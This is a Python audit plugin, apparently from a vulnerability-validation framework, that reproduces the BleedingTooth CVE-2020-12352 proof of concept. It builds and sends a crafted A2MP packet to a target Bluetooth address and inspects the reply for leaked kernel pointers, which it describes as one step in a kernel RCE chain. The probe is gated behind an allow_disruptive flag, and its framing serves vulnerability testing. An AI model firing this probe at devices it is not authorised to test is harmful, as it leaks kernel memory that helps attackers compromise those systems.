#!/usr/bin/env python3
"""CVE-2020-12352 – BleedingTooth: Linux kernel Bluetooth A2MP heap information leak.

Public PoC source: https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth
  (Andy Nguyen / Google Project Zero, 2020)

Attack technique:
  The A2MP (Amp Manager Protocol) channel in Linux BlueZ mishandles the
  A2MP_GETINFO_RSP command.  When a crafted A2MP_GETINFO_RSP with a
  controller_id not in the local amp_ctrl_list is sent, the kernel fills
  the response from uninitialized stack memory, leaking kernel pointers.
  This is the info-leak primitive that can be chained with CVE-2020-12351
  (L2CAP type confusion) for full kernel RCE.

  Exploit requires raw Bluetooth HCI access (CAP_NET_RAW or CAP_NET_ADMIN).

Adapted plugin: Uses Python scapy-bluetooth / PyBluez to send a crafted
  A2MP L2CAP packet on CID 0x0003 and checks the response for non-zero
  pointers indicating kernel memory exposure.
"""
from __future__ import annotations

import shutil
import struct
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 60,
    "cve": "CVE-2020-12352",
    "year": 2020,
    "domain": "wireless",
    "vendor_product": "Linux kernel Bluetooth / BlueZ",
    "component": "A2MP (Amp Manager Protocol) A2MP_GETINFO_RSP handler",
    "type": "Heap information leak",
    "summary": (
        "A2MP_GETINFO_RSP with unknown controller_id causes kernel to "
        "return uninitialized heap memory in the response, leaking kernel "
        "pointers that can bypass KASLR as part of BleedingTooth RCE chain."
    ),
    "source_url": "https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth",
    "requires_manual_review": True,
    "affected": [{"vendor": "Linux", "product": "Linux kernel BlueZ",
                  "versions": [{"version": "<5.9", "status": "affected"}]}],
}

# A2MP frame constants
A2MP_CID         = 0x0003
A2MP_GETINFO_REQ = 0x06
A2MP_GETINFO_RSP = 0x07
L2CAP_CMD_HDR_SIZE = 4  # code(1) + ident(1) + len(2)


def _build_a2mp_getinfo_req(ident: int = 1, ctrl_id: int = 0xFE) -> bytes:
    """
    Build A2MP_GETINFO_REQ packet with a non-existent controller_id.
    Response from vulnerable kernel will contain uninitialized heap bytes.
    """
    payload = struct.pack('<I', ctrl_id)   # controller_id (4 bytes, LE)
    hdr     = struct.pack('<BBHH',
                          A2MP_GETINFO_REQ,  # code
                          ident,             # ident
                          len(payload),      # len
                          A2MP_CID)          # A2MP CID (sent in L2CAP cmd layer)
    return hdr + payload


def _probe_a2mp(target_bdaddr: str) -> dict:
    """Send crafted A2MP_GETINFO_REQ and inspect response for kernel pointer leak."""
    result = {"leak_detected": False, "response_bytes": "", "detail": ""}
    try:
        import bluetooth
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(5)
        sock.connect((target_bdaddr, A2MP_CID))
        req = _build_a2mp_getinfo_req()
        sock.send(req)
        resp = sock.recv(64)
        sock.close()
        result["response_bytes"] = resp.hex()
        # A kernel pointer leak: non-zero bytes at offset 8+ in response
        if len(resp) > 8 and any(b != 0 for b in resp[8:16]):
            result["leak_detected"] = True
            result["detail"] = f"Non-zero bytes in response indicate kernel pointer leak"
    except ImportError:
        result["detail"] = "PyBluez (bluetooth) not installed; install with: pip install pybluez2"
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _run_poc(plugin):
    target   = (plugin.params or {}).get("target_bdaddr", "")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2020-12352",
        "attack": "A2MP_GETINFO_REQ with unknown ctrl_id → uninitialized heap leak",
        "a2mp_frame": _build_a2mp_getinfo_req().hex(),
        "exploit_chain": "CVE-2020-12352 (info leak) + CVE-2020-12351 (L2CAP UAF) → kernel RCE",
    }

    if allow_disruptive and target:
        probe = _probe_a2mp(target)
        evidence.update(probe)
    elif not target:
        evidence["detail"] = "Supply target_bdaddr= (e.g. AA:BB:CC:DD:EE:FF) + allow_disruptive=true"
    else:
        evidence["detail"] = "Probe ready. Set allow_disruptive=true to send A2MP packet."

    return {
        "vulnerable": evidence.get("leak_detected"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "google/security-research/bleedingtooth / CVE-2020-12352 A2MP info leak",
    }


class Poc85CVE202012352BleedingToothA2mpHeapLeakAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-WIRELESS-085"
    meta_poc_name   = "CVE-2020-12352 BleedingTooth A2MP Heap Information Leak"
    meta_cve_id     = "CVE-2020-12352"
    meta_severity   = "High"
    meta_protocol   = "bluetooth"
    meta_target_os  = ["linux"]
    meta_required_params = ["target_bdaddr"]
    meta_optional_params = ["allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth"
    meta_attack_surface = "Linux BlueZ A2MP uninitialized heap leak (BleedingTooth)"
    is_disruptive   = False

    def check_prerequisites(self):
        return bool((self.params or {}).get("target_bdaddr"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
